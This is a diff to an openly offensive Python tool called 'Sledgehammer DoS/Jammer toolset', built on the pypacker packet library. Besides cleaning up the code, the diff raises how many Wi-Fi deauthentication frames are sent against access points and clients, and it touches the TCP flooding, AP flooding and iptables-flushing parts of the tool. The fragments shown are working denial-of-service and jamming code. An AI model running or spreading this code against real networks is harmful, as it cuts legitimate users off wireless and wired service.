@@ -12,7 +12,6 @@ import time
 import threading
 import logging
 import argparse
-import threading
 import subprocess
 import random
 import collections
@@ -22,7 +21,7 @@ import re
 
 from pypacker.layer12 import ethernet, arp, radiotap, ieee80211
 from pypacker.layer3 import ip, icmp
-from pypacker.layer4 import tcp, udp
+from pypacker.layer4 import tcp
 from pypacker import pypacker, psocket, utils
 
 unpack_I = struct.Struct(">I").unpack
@@ -37,6 +36,7 @@ logger_formatter = logging.Formatter("%(message)s")
 logger_streamhandler.setFormatter(logger_formatter)
 
 logger.addHandler(logger_streamhandler)
+
 
 def wifi_deauth_cb(pargs):
 	"""
@@ -96,10 +96,12 @@ def wifi_deauth_cb(pargs):
 	thread_listen = threading.Thread(target=listen_cycler, args=[pargs])
 	thread_listen.start()
 
-	seq = 0
 	logger.info("First round slow start..")
 
 	for cnt in range(pargs.count):
+		seq = 0
+		layer_deauth.seq = seq
+
 		if not pargs.is_running:
 			break
 
@@ -138,7 +140,7 @@ def wifi_deauth_cb(pargs):
 					# TODO: check sequence
 					# logger.debug("deauth AP: %r", mac_ap)
 
-					for cnt_da in range(1):
+					for _ in range(5):
 						layer_deauth.seq += 1
 						psock_send.send(pkt_deauth.bin())
 
@@ -147,7 +149,7 @@ def wifi_deauth_cb(pargs):
 					pkt_deauth.src = mac_client
 					pkt_deauth.dst = mac_client
 
-					for cnt_da in range(1):
+					for _ in range(2):
 						layer_deauth.seq += 1
 						psock_send.send(pkt_deauth.bin())
 
@@ -229,7 +231,7 @@ def wifi_ap_cb(pargs):
 				pass
 			except OSError:
 				sleeptime *= 2
-				logger.warning("\nbuffer full, new sleeptime: %03.3f, waiting..." % sleeptime)
+				logger.warning("buffer full, new sleeptime: %03.3f, waiting...", sleeptime)
 				time.sleep(1)
 	psock_send.close()
 
@@ -391,8 +393,6 @@ def tcp_cb(pargs):
 	psock_rcv.close()
 
 
-
-
 PATTERN_IP = re.compile(b"inet (\d+\.\d+\.\d+\.\d+)")
 PATTERN_MAC = re.compile(b"ether (.{2}:.{2}:.{2}:.{2}:.{2}:.{2})")
 
@@ -424,13 +424,13 @@ def get_iface_info(iface_name):
 def set_iptables_rules(rules_str):
 	logger.debug("removing iptables rules")
 	cmd_call = ["iptables", "-F"]
-	output = subprocess.check_output(cmd_call)
+	subprocess.check_output(cmd_call)
 
 	rules = rules_str.split("\n")
 
 	for rule in rules:
 		cmd_call = ["iptables", rule]
-		output = subprocess.check_output(cmd_call)
+		subprocess.check_output(cmd_call)
 
 
 if __name__ == "__main__":
@@ -448,19 +448,19 @@ if __name__ == "__main__":
 		"""'FF' -> 255"""
 		return int(x, 16)
 
-	mode_descr = ",".join(["%s (params: %s)" % (mode, cb[0]) for mode, cb in mode_cb.items()])
+	mode_descr = ",".join([" %s (params: %s)" % (mode, cb[0]) for mode, cb in mode_cb.items()])
 
 	parser = argparse.ArgumentParser(
-		description="Sledgehammer DoS/Jammer",
+		description="Sledgehammer DoS/Jammer toolset",
 		formatter_class=argparse.RawDescriptionHelpFormatter)
-	parser.add_argument("--mode", type=str, help="Chose one of: %s" % mode_descr, required=True)
-	parser.add_argument("--iface_name", type=str, help="Interface to be used", required=True)
-	parser.add_argument("--count", type=int, help="Amount of packets to be sent", required=False, default=100)
+	parser.add_argument("-m", "--mode", type=str, help="Chose one of: %s" % mode_descr, required=True)
+	parser.add_argument("-i", "--iface_name", type=str, help="Interface to be used", required=True)
+	parser.add_argument("-c", "--count", type=int, help="Amount of packets to be sent", required=False, default=100)
 	parser.add_argument("--mac_dst", type=str, help="MAC address of direct target or router", required=False)
 	parser.add_argument("--ip_dst", type=str, help="Target IP address", required=False)
 	parser.add_argument("--port_dst", type=int, help="Target IP address", required=False)
 	parser.add_argument("--channels", type=str, help="Channels to scan", required=False, default=None)
-	parser.add_argument("--nobroadcast", type=bool, help="Disable broadcast deauth", required=False, default=False)
+	parser.add_argument("-n", "--nobroadcast", type=bool, help="Disable broadcast deauth", required=False, default=False)
 	parser.add_argument("--macs_excluded", type=str, help="MAC addresses to exclude for deauth", required=False, default=set())
 
 	args = parser.parse_args()
@@ -475,6 +475,7 @@ if __name__ == "__main__":
 
 	if args.mode in wifi_modes:
 		logger.info("trying to activate monitor mode on %s", args.iface_name)
+
 		try:
 			utils.set_interface_mode(args.iface_name, monitor_active=True, state_active=True)
 		except:
